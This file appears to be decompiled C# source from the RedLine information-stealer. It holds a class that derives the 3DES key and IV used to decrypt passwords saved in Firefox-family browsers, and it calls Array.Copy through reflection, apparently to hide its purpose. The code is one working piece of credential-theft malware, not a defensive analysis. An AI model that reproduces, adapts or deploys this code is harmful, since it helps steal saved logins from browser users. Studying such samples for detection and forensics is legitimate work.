using System;
using System.Reflection;
using System.Security.Cryptography;

namespace RedLine.Logic.Browsers.Gecko
{
	// Token: 0x0200006B RID: 107
	public class GeckoPasswordBasedEncryption
	{
		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x060002D6 RID: 726 RVA: 0x0000D57A File Offset: 0x0000B77A
		private byte[] _globalSalt { get; }

		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x060002D7 RID: 727 RVA: 0x0000D582 File Offset: 0x0000B782
		private byte[] _masterPassword { get; }

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x060002D8 RID: 728 RVA: 0x0000D58A File Offset: 0x0000B78A
		private byte[] _entrySalt { get; }

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x060002D9 RID: 729 RVA: 0x0000D592 File Offset: 0x0000B792
		// (set) Token: 0x060002DA RID: 730 RVA: 0x0000D59A File Offset: 0x0000B79A
		public byte[] DataKey { get; private set; }

		// Token: 0x170000CC RID: 204
		// (get) Token: 0x060002DB RID: 731 RVA: 0x0000D5A3 File Offset: 0x0000B7A3
		// (set) Token: 0x060002DC RID: 732 RVA: 0x0000D5AB File Offset: 0x0000B7AB
		public byte[] DataIV { get; private set; }

		// Token: 0x060002DD RID: 733 RVA: 0x0000D5B4 File Offset: 0x0000B7B4
		public GeckoPasswordBasedEncryption(byte[] salt, byte[] password, byte[] entry)
		{
			this._globalSalt = salt;
			this._masterPassword = password;
			this._entrySalt = entry;
		}

		// Token: 0x060002DE RID: 734 RVA: 0x0000D5D4 File Offset: 0x0000B7D4
		public void Init()
		{
			MethodInfo method = typeof(Array).GetMethod("Copy", new Type[]
			{
				typeof(Array),
				typeof(int),
				typeof(Array),
				typeof(int),
				typeof(int)
			});
			SHA1 sha = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			method.Invoke(null, new object[]
			{
				this._globalSalt,
				0,
				array,
				0,
				this._globalSalt.Length
			});
			method.Invoke(null, new object[]
			{
				this._masterPassword,
				0,
				array,
				this._globalSalt.Length,
				this._masterPassword.Length
			});
			byte[] array2 = sha.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			method.Invoke(null, new object[]
			{
				array2,
				0,
				array3,
				0,
				array2.Length
			});
			method.Invoke(null, new object[]
			{
				this._entrySalt,
				0,
				array3,
				array2.Length,
				this._entrySalt.Length
			});
			byte[] key = sha.ComputeHash(array3);
			byte[] array4 = new byte[20];
			method.Invoke(null, new object[]
			{
				this._entrySalt,
				0,
				array4,
				0,
				this._entrySalt.Length
			});
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			method.Invoke(null, new object[]
			{
				array4,
				0,
				array5,
				0,
				array4.Length
			});
			method.Invoke(null, new object[]
			{
				this._entrySalt,
				0,
				array5,
				array4.Length,
				this._entrySalt.Length
			});
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				method.Invoke(null, new object[]
				{
					array7,
					0,
					array8,
					0,
					array7.Length
				});
				method.Invoke(null, new object[]
				{
					this._entrySalt,
					0,
					array8,
					array7.Length,
					this._entrySalt.Length
				});
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			method.Invoke(null, new object[]
			{
				array6,
				0,
				array10,
				0,
				array6.Length
			});
			method.Invoke(null, new object[]
			{
				array9,
				0,
				array10,
				array6.Length,
				array9.Length
			});
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
